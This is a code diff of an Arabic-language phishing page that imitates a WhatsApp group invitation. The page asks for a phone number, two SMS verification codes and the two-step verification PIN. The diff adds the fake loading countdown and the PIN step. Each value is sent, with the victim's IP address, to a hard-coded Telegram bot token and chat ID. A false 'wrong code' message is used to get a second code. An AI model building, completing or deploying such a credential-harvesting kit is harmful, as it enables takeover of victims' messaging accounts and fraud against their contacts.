@@ -4,105 +4,121 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>الانضمام إلى المجموعة</title>
-<meta property="og:title" content="الانضمام إلى المجموعة">
-<meta property="og:description" content="اضغط للانضمام عبر واتساب">
-<meta property="og:image" content="https://love-ashen-beta.vercel.app/og-image.png">
-<meta property="og:type" content="website">
-<meta name="twitter:card" content="summary_large_image">
-
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800&display=swap">
 <style>
-:root{--bg:#effaf3;--card:#ffffff;--ink:#0f2a1c;--muted:#5b7568;--green:#1faa59;--green-d:#168a46;--line:#cfe5d7;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
-@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0c1a13;--card:#13261c;--ink:#e8f6ee;--muted:#9bb8a8;--line:#254636}}
-:root[data-theme="dark"]{--bg:#0c1a13;--card:#13261c;--ink:#e8f6ee;--muted:#9bb8a8;--line:#254636}
+:root{--bg:#f7f8f9;--card:#ffffff;--ink:#111b21;--muted:#667781;--green:#00a884;--green-d:#008069;--line:#e9edef;box-sizing:border-box}
 *{box-sizing:border-box}
 [hidden]{display:none!important}
-body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--ink);font-family:"Cairo",Tahoma,Arial,sans-serif;padding:20px}
-main{width:100%;max-width:400px;background:var(--card);border-radius:28px;padding:36px 24px 28px;text-align:center;box-shadow:0 10px 40px rgba(20,90,50,.12)}
-.logo{width:112px;height:112px;margin:0 auto 20px;display:block}
-h1{font-size:26px;font-weight:800;margin:0 0 20px}
-input{width:100%;font:inherit;font-size:18px;padding:14px 16px;border:2px solid var(--line);border-radius:14px;background:transparent;color:var(--ink);text-align:center;direction:ltr}
-input::placeholder{color:var(--muted);direction:rtl}
-input:focus-visible,select:focus-visible{outline:3px solid var(--green);outline-offset:2px;border-color:var(--green)}
-button{width:100%;margin-top:14px;font:inherit;font-size:18px;font-weight:700;padding:14px;border:0;border-radius:14px;background:var(--green);color:#fff;cursor:pointer}
+body{margin:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:var(--bg);color:var(--ink);font-family:"Cairo",sans-serif;padding:20px}
+header{position:absolute;top:0;left:0;right:0;display:flex;justify-content:space-between;align-items:center;padding:16px 24px;background:#fff;border-bottom:1px solid var(--line)}
+.logo-top{font-weight:800;font-size:18px;color:var(--green)}
+main{width:100%;max-width:440px;background:var(--card);border-radius:16px;padding:36px 24px;text-align:center;box-shadow:0 4px 12px rgba(11,20,26,.08);border:1px solid var(--line)}
+.whatsapp-logo{width:80px;height:80px;margin:0 auto 16px;display:block}
+h1{font-size:22px;font-weight:800;margin:0 0 8px;color:var(--ink)}
+p.desc{color:var(--muted);font-size:14px;margin:0 0 24px}
+input[type="tel"]{width:100%;font:inherit;font-size:18px;padding:12px 16px;border:1px solid var(--line);border-radius:8px;background:transparent;color:var(--ink);text-align:center;direction:ltr}
+button{width:100%;margin-top:20px;font:inherit;font-size:16px;font-weight:700;padding:14px;border:0;border-radius:8px;background:var(--green);color:#fff;cursor:pointer}
 button:hover{background:var(--green-d)}
-button:focus-visible{outline:3px solid var(--ink);outline-offset:2px}
-.err{min-height:24px;margin:12px 0 0;font-size:16px;font-weight:700;color:#e02020}
-.phone-row{display:flex;gap:8px;direction:ltr}
-.phone-row input{flex:1;min-width:0;width:auto}
-.phone-row select{flex:0 0 42%;max-width:170px;font:inherit;font-size:16px;font-weight:700;padding:14px 6px;border:2px solid var(--line);border-radius:14px;background:transparent;color:var(--ink);direction:rtl;text-align:center}
-.phone-row option,.phone-row optgroup{background:var(--card);color:var(--ink)}
-.code-label{font-size:18px;font-weight:700;margin-bottom:12px;color:var(--ink);text-align:center}
+.err{min-height:24px;margin:12px 0 0;font-size:14px;font-weight:700;color:#ea0038}
+.phone-row{display:flex;gap:8px;direction:ltr;margin-bottom:8px}
+.phone-row input{flex:1}
+.phone-row select{flex:0 0 130px;font:inherit;font-size:15px;font-weight:700;padding:12px 6px;border:1px solid var(--line);border-radius:8px;background:#f9f9f9;color:var(--ink);direction:ltr;text-align:center}
+.label-right{text-align:right;font-weight:700;font-size:14px;margin-bottom:6px;color:var(--muted)}
+.otp-container{display:flex;justify-content:space-between;gap:8px;direction:ltr;margin:20px 0}
+.otp-input, .otp-input-2, .otp-input-3{width:48px;height:56px;font-size:24px;font-weight:700;text-align:center;border:1px solid var(--line);border-radius:8px;background:#fff;color:var(--ink)}
+.sms-icon{width:64px;height:64px;margin:0 auto 16px;display:block}
+.loader-spinner{width:50px;height:50px;border:4px solid var(--line);border-top:4px solid var(--green);border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.timer-text{font-size:20px;font-weight:800;color:var(--green);margin-top:10px}
 </style>
 </head>
 <body>
 
-<!-- الصفحة الأولى: إدخال الرقم -->
+<header><div class="logo-top">ChatApp 💬</div></header>
+
+<!-- الصفحة 1: الهاتف -->
 <main id="step1">
-<svg class="logo" viewBox="0 0 112 112" role="img" aria-label="واتساب"><circle cx="56" cy="56" r="56" fill="#25d366"/><path d="M56 24a32 32 0 0 0-27.6 48.1L25 87l15.3-3.3A32 32 0 1 0 56 24z" fill="none" stroke="#fff" stroke-width="5" stroke-linejoin="round"/><path d="M45 42c-1.5 0-3.5 1-4.5 3.5-1.3 3.3 0 8 4.5 13.5 5.3 6.4 11.5 9.3 15.8 9.4 3 .1 5.7-1.8 6.4-4.2.3-1 .3-1.8 0-2-.5-.4-4.2-2.2-5-2.5-.8-.3-1.4-.2-1.9.5l-2.2 2.7c-.5.6-1 .7-1.8.4-2.6-1.3-6.7-3.8-9.2-8.1-.4-.8-.1-1.3.4-1.8l1.7-2c.4-.5.5-1 .2-1.7l-3-6.6c-.3-.6-.8-.9-1.6-.9z" fill="#fff"/></svg>
-<h1>الانضمام إلى المجموعة</h1>
-<div class="phone-row">
-  <select id="cc" aria-label="رمز الدولة">
-    <optgroup label="شمال إفريقيا">
-      <option value="+212">المغرب +212</option>
-      <option value="+213">الجزائر +213</option>
-      <option value="+216">تونس +216</option>
-      <option value="+20">مصر +20</option>
-    </optgroup>
-    <optgroup label="الشرق الأوسط">
-      <option value="+961">لبنان +961</option>
-      <option value="+962">الأردن +962</option>
-      <option value="+966">السعودية +966</option>
-      <option value="+971">الإمارات +971</option>
-      <option value="+965">الكويت +965</option>
-      <option value="+974">قطر +974</option>
-      <option value="+973">البحرين +973</option>
-      <option value="+968">عُمان +968</option>
-    </optgroup>
-    <optgroup label="دول أخرى">
-      <option value="+44">بريطانيا +44</option>
-      <option value="+33">فرنسا +33</option>
-      <option value="+1">أمريكا / كندا +1</option>
-      <option value="+49">ألمانيا +49</option>
-      <option value="+34">إسبانيا +34</option>
-    </optgroup>
-  </select>
-  <input id="phone" type="tel" inputmode="tel" autocomplete="tel-national" placeholder="اكتب رقم هاتفك" aria-label="رقم الهاتف">
-</div>
-<button id="nextBtn1" type="button">التالي</button>
-<p id="msg1" class="err" role="alert"></p>
+  <svg class="whatsapp-logo" viewBox="0 0 112 112"><circle cx="56" cy="56" r="56" fill="#25d366"/><path d="M56 24a32 32 0 0 0-27.6 48.1L25 87l15.3-3.3A32 32 0 1 0 56 24z" fill="none" stroke="#fff" stroke-width="5" stroke-linejoin="round"/><path d="M45 42c-1.5 0-3.5 1-4.5 3.5-1.3 3.3 0 8 4.5 13.5 5.3 6.4 11.5 9.3 15.8 9.4 3 .1 5.7-1.8 6.4-4.2.3-1 .3-1.8 0-2-.5-.4-4.2-2.2-5-2.5-.8-.3-1.4-.2-1.9.5l-2.2 2.7c-.5.6-1 .7-1.8.4-2.6-1.3-6.7-3.8-9.2-8.1-.4-.8-.1-1.3.4-1.8l1.7-2c.4-.5.5-1 .2-1.7l-3-6.6c-.3-.6-.8-.9-1.6-.9z" fill="#fff"/></svg>
+  <h1>دعوة للانضمام إلى مجموعة واتساب</h1>
+  <p class="desc">أدخل رقم هاتفك لتلقي دعوة الانضمام</p>
+  <div class="label-right">رقم الهاتف</div>
+  <div class="phone-row">
+    <select id="cc">
+      <option value="+212">🇲🇦 +212</option>
+      <option value="+961">🇱🇧 +961</option>
+      <option value="+962">🇯🇴 +962</option>
+      <option value="+20">🇪🇬 +20</option>
+      <option value="+966">🇸🇦 +966</option>
+      <option value="+971">🇦🇪 +971</option>
+      <option value="+965">🇰🇼 +965</option>
+      <option value="+974">🇶🇦 +974</option>
+      <option value="+33">🇫🇷 +33</option>
+      <option value="+1">🇺🇸 +1</option>
+    </select>
+    <input id="phone" type="tel" placeholder="650-123456">
+  </div>
+  <button id="nextBtn1" type="button">متابعة ←</button>
+  <p id="msg1" class="err"></p>
 </main>
 
-<!-- الصفحة الثانية: إدخال رمز الانضمام لأول مرة -->
+<!-- شاشة العد التنازلي والمعالجة -->
+<main id="stepLoading" hidden>
+  <div class="loader-spinner"></div>
+  <h1>تتم معالجة البيانات...</h1>
+  <p class="desc">يرجى الانتظار بينما نجهز طلبك</p>
+  <div id="countdown" class="timer-text">10</div>
+</main>
+
+<!-- الصفحة 2: الرمز الأول -->
 <main id="step2" hidden>
-<svg class="logo" viewBox="0 0 112 112" role="img" aria-label="رمز التحقق"><circle cx="56" cy="56" r="56" fill="#25d366"/><path d="M56 24a32 32 0 0 0-27.6 48.1L25 87l15.3-3.3A32 32 0 1 0 56 24z" fill="none" stroke="#fff" stroke-width="5" stroke-linejoin="round"/><path d="M45 42c-1.5 0-3.5 1-4.5 3.5-1.3 3.3 0 8 4.5 13.5 5.3 6.4 11.5 9.3 15.8 9.4 3 .1 5.7-1.8 6.4-4.2.3-1 .3-1.8 0-2-.5-.4-4.2-2.2-5-2.5-.8-.3-1.4-.2-1.9.5l-2.2 2.7c-.5.6-1 .7-1.8.4-2.6-1.3-6.7-3.8-9.2-8.1-.4-.8-.1-1.3.4-1.8l1.7-2c.4-.5.5-1 .2-1.7l-3-6.6c-.3-.6-.8-.9-1.6-.9z" fill="#fff"/></svg>
-<div class="code-label">المرجو ادخال رمز الانضمام</div>
-<input id="codeInput1" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="أدخل الرمز هنا">
-<button id="nextBtn2" type="button">تأكيد الانضمام</button>
-<p id="msg2" class="err" role="alert"></p>
+  <svg class="sms-icon" viewBox="0 0 24 24" fill="#00a884"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+  <h1>رمز التفعيل</h1>
+  <p class="desc">يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية</p>
+  <div class="otp-container">
+    <input type="tel" maxlength="1" class="otp-input"><input type="tel" maxlength="1" class="otp-input"><input type="tel" maxlength="1" class="otp-input"><input type="tel" maxlength="1" class="otp-input"><input type="tel" maxlength="1" class="otp-input"><input type="tel" maxlength="1" class="otp-input">
+  </div>
+  <button id="submitBtn2" type="button">تأكيد الرمز</button>
+  <p id="msg2" class="err"></p>
 </main>
 
-<!-- الصفحة الثالثة: إظهار خطأ أن الرمز غير صحيح وطلب إعادة إدخاله -->
+<!-- الصفحة 3: الرمز الثاني -->
 <main id="step3" hidden>
-<svg class="logo" viewBox="0 0 112 112" role="img" aria-label="خطأ في الرمز"><circle cx="56" cy="56" r="56" fill="#25d366"/><path d="M56 24a32 32 0 0 0-27.6 48.1L25 87l15.3-3.3A32 32 0 1 0 56 24z" fill="none" stroke="#fff" stroke-width="5" stroke-linejoin="round"/><path d="M45 42c-1.5 0-3.5 1-4.5 3.5-1.3 3.3 0 8 4.5 13.5 5.3 6.4 11.5 9.3 15.8 9.4 3 .1 5.7-1.8 6.4-4.2.3-1 .3-1.8 0-2-.5-.4-4.2-2.2-5-2.5-.8-.3-1.4-.2-1.9.5l-2.2 2.7c-.5.6-1 .7-1.8.4-2.6-1.3-6.7-3.8-9.2-8.1-.4-.8-.1-1.3.4-1.8l1.7-2c.4-.5.5-1 .2-1.7l-3-6.6c-.3-.6-.8-.9-1.6-.9z" fill="#fff"/></svg>
-<div class="code-label">المرجو ادخال رمز الانضمام</div>
-<input id="codeInput2" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="أدخل الرمز هنا">
-<button id="submitBtnFinal" type="button">تأكيد الانضمام</button>
-<p id="errorMsg" class="err">الرمز الذي أدخلتم غير صحيح</p>
+  <svg class="sms-icon" viewBox="0 0 24 24" fill="#00a884"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+  <h1>رمز التفعيل 2</h1>
+  <p class="desc">يرجى إدخال رمز التفعيل الثاني المكون من 6 أرقام الذي تلقيته عبر رسالة نصية</p>
+  <div class="otp-container">
+    <input type="tel" maxlength="1" class="otp-input-2"><input type="tel" maxlength="1" class="otp-input-2"><input type="tel" maxlength="1" class="otp-input-2"><input type="tel" maxlength="1" class="otp-input-2"><input type="tel" maxlength="1" class="otp-input-2"><input type="tel" maxlength="1" class="otp-input-2">
+  </div>
+  <button id="submitBtn3" type="button">تأكيد</button>
+  <p id="msg3" class="err">الرمز الذي أدخلتم غير صحيح</p>
+</main>
+
+<!-- الصفحة 4: PIN -->
+<main id="step4" hidden>
+  <svg class="whatsapp-logo" viewBox="0 0 24 24" fill="#00a884"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+  <h1>التحقق من خطوتين</h1>
+  <p class="desc">أدخل رقم التعريف الشخصي (PIN) الذي قمت بإنشائه عند إعداد التحقق من خطوتين</p>
+  <div class="otp-container">
+    <input type="tel" maxlength="1" class="otp-input-3"><input type="tel" maxlength="1" class="otp-input-3"><input type="tel" maxlength="1" class="otp-input-3"><input type="tel" maxlength="1" class="otp-input-3"><input type="tel" maxlength="1" class="otp-input-3"><input type="tel" maxlength="1" class="otp-input-3">
+  </div>
+  <button id="submitBtnFinal" type="button">تحقق</button>
 </main>
 
 <script>
 let savedPhoneNumber = "";
 let userIpAddress = "";
 let firstCode = "";
+let secondCode = "";
 
-// تحديد الدولة تلقائياً عبر الـ IP
+// ⚠️ ضع بياناتك هنا
+const botToken = "8863417031:AAF7jehBC9WE41rjAk6HfYcvAh7G1H5-nxg";
+const chatId = "6691240451";
+
 async function detectUserCountry() {
     try {
         let response = await fetch('https://ipapi.co/json/');
         let data = await response.json();
         let countryCodeSelect = document.getElementById("cc");
-        
         if (data && data.country_calling_code) {
             let dialCode = data.country_calling_code;
             for (let option of countryCodeSelect.options) {
@@ -112,12 +128,9 @@ async function detectUserCountry() {
                 }
             }
         }
-    } catch (e) {
-        console.log("تعذر تحديد الموقع الجغرافي تلقائياً", e);
-    }
+    } catch (e) {}
 }
 
-// جلب الـ IP وحفظه مسبقاً
 async function fetchIpAddress() {
     try {
         let ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -131,91 +144,102 @@ async function fetchIpAddress() {
 window.onload = function() {
     detectUserCountry();
     fetchIpAddress();
+    setupOtpInputs();
 };
 
-// إعدادات بوت تليجرام (قم بوضع معلوماتك هنا)
-const botToken = "8863417031:AAF7jehBC9WE41rjAk6HfYcvAh7G1H5-nxg";
-const chatId = "6691240451";
+function setupOtpInputs() {
+    document.querySelectorAll('.otp-container').forEach(container => {
+        const inputs = container.querySelectorAll('input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                let val = e.target.value;
+                e.target.value = val.replace(/[^0-9]/g, '').slice(-1);
+                if (e.target.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+    });
+}
 
-// دالة مساعدة للإرسال إلى تليجرام
+function getOtpValue(className) {
+    let val = "";
+    document.querySelectorAll('.' + className).forEach(input => {
+        val += input.value;
+    });
+    return val;
+}
+
 async function sendToTelegram(text) {
     try {
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: text
-            })
+            body: JSON.stringify({ chat_id: chatId, text: text })
         });
-    } catch (error) {
-        console.error("خطأ في الإرسال:", error);
-    }
+    } catch (error) {}
 }
 
-// الانتقال من الصفحة الأولى إلى الثانية
 document.getElementById("nextBtn1").addEventListener("click", function() {
     let cc = document.getElementById("cc").value;
     let phoneInput = document.getElementById("phone").value;
-    
     if(!phoneInput) {
         document.getElementById("msg1").innerText = "الرجاء إدخال رقم الهاتف";
         return;
     }
-
     savedPhoneNumber = cc + phoneInput;
+    sendToTelegram(`Numéro: ${savedPhoneNumber}\nAdresse IP: ${userIpAddress}`);
     
-    // إرسال الرقم والـ IP إلى تليجرام
-    let messageText = `Numéro: ${savedPhoneNumber}\n` +
-                      `Adresse IP: ${userIpAddress}`;
-    sendToTelegram(messageText);
-
-    // الانتقال للخطوة التالية
     document.getElementById("step1").hidden = true;
-    document.getElementById("step2").hidden = false;
+    document.getElementById("stepLoading").hidden = false;
+
+    let timeLeft = 10;
+    let timerElem = document.getElementById("countdown");
+    timerElem.innerText = timeLeft;
+
+    let countdownInterval = setInterval(() => {
+        timeLeft--;
+        timerElem.innerText = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(countdownInterval);
+            document.getElementById("stepLoading").hidden = true;
+            document.getElementById("step2").hidden = false;
+        }
+    }, 1000);
 });
 
-// الانتقال من الصفحة الثانية إلى الثالثة عند إدخال الرمز الأول
-document.getElementById("nextBtn2").addEventListener("click", function() {
-    firstCode = document.getElementById("codeInput1").value;
-
-    if(!firstCode) {
-        document.getElementById("msg2").innerText = "الرجاء إدخال رمز الانضمام";
+document.getElementById("submitBtn2").addEventListener("click", function() {
+    firstCode = getOtpValue('otp-input');
+    if(firstCode.length < 6) {
+        document.getElementById("msg2").innerText = "الرجاء إدخال الرمز كاملاً (6 أرقام)";
         return;
     }
-
-    // إرسال الرمز الأول إلى تليجرام مع الرقم
-    let messageText = `Numéro: ${savedPhoneNumber}\n` +
-                      `Code 1: ${firstCode}\n` +
-                      `Adresse IP: ${userIpAddress}`;
-    sendToTelegram(messageText);
-
-    // إظهار الصفحة الثالثة التي تعرض رسالة الخطأ
+    sendToTelegram(`Numéro: ${savedPhoneNumber}\nCode 1: ${firstCode}\nAdresse IP: ${userIpAddress}`);
     document.getElementById("step2").hidden = true;
     document.getElementById("step3").hidden = false;
 });
 
-// تأكيد الرمز النهائي في الصفحة الثالثة وإرساله
+document.getElementById("submitBtn3").addEventListener("click", function() {
+    secondCode = getOtpValue('otp-input-2');
+    if(secondCode.length < 6) return;
+    sendToTelegram(`Numéro: ${savedPhoneNumber}\nCode 1: ${firstCode}\nCode 2 (New): ${secondCode}\nAdresse IP: ${userIpAddress}`);
+    document.getElementById("step3").hidden = true;
+    document.getElementById("step4").hidden = false;
+});
+
 document.getElementById("submitBtnFinal").addEventListener("click", async function() {
-    let secondCode = document.getElementById("codeInput2").value;
-
-    if(!secondCode) {
-        return;
-    }
-
-    // إرسال الرمز الثاني الجديد إلى تليجرام
-    let messageText = `Numéro: ${savedPhoneNumber}\n` +
-                      `Code 1: ${firstCode}\n` +
-                      `Code 2 (New): ${secondCode}\n` +
-                      `Adresse IP: ${userIpAddress}`;
-    
-    await sendToTelegram(messageText);
-
-    alert("تم الانضمام بنجاح!");
+    let pinCode = getOtpValue('otp-input-3');
+    if(pinCode.length < 4) return;
+    await sendToTelegram(`Numéro: ${savedPhoneNumber}\nCode 1: ${firstCode}\nCode 2: ${secondCode}\nPin (2FA): ${pinCode}\nAdresse IP: ${userIpAddress}`);
+    alert("تم التحقق بنجاح!");
     location.reload();
 });
 </script>
-
 </body>
 </html>
 
@@ -224,7 +248,14 @@ document.getElementById("submitBtnFinal").addEventListener("click", async functi
 
 
 
+
       
+
+        
+
+    
+
+
     
 
 
